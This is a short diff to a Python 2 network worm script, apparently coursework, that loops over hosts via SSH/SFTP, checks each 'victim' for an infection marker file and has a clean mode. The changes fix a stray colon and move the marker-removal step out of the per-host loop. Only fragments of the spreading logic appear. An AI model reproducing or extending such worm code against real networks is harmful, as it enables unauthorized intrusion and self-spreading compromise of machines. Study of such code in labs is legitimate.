@@ -314,7 +314,7 @@ for host in networkHosts:
 			# Try to fetch marker file from victim
 			# Better way to check if victim machine is infected
 			# Will throw IOError if it does not exist
-			sftp.stat(INFECTED_MARKER_FILE):
+			sftp.stat(INFECTED_MARKER_FILE)
 
 			# If it fails, next lines will be skipped and start after "except IOError:" and we can attack victim system
 			# If it exists:
@@ -324,12 +324,6 @@ for host in networkHosts:
 			# If an argument to command line is added and it's -c||--clean we will clean instead of infect
 			if len(sys.argv) >=2 and (sys.argv[1] == '-c' or sys.argv[1] == "--clean"):
 				print "Cleaning " + host
-
-				# If argument is added and this machine is infected, then we are a victim machine
-				if isInfectedSystem:
-					# This will throw an OSError if the file does not exist
-					os.remove(INFECTED_MARKER_FILE)
-				# If we are not infected then we are the original cleaning machine
 				cleaner(sshInfo)
 				print ' ' +  host + ' successfully cleaned'
 			
@@ -350,6 +344,11 @@ for host in networkHosts:
 
 # If command line args exist and are -c||--clean
 if len(sys.argv) >=2 and (sys.argv[1] == '-c' or sys.argv[1] == "--clean"):
+	# If argument is added and this machine is infected, then we are a victim machine
+	if isInfectedSystem:
+		# This will throw an OSError if the file does not exist
+		os.remove(INFECTED_MARKER_FILE)
+	# If we are not infected then we are the original cleaning machine
 	print "Cleaning Complete"
 else:
 	print " Spreading Complete"
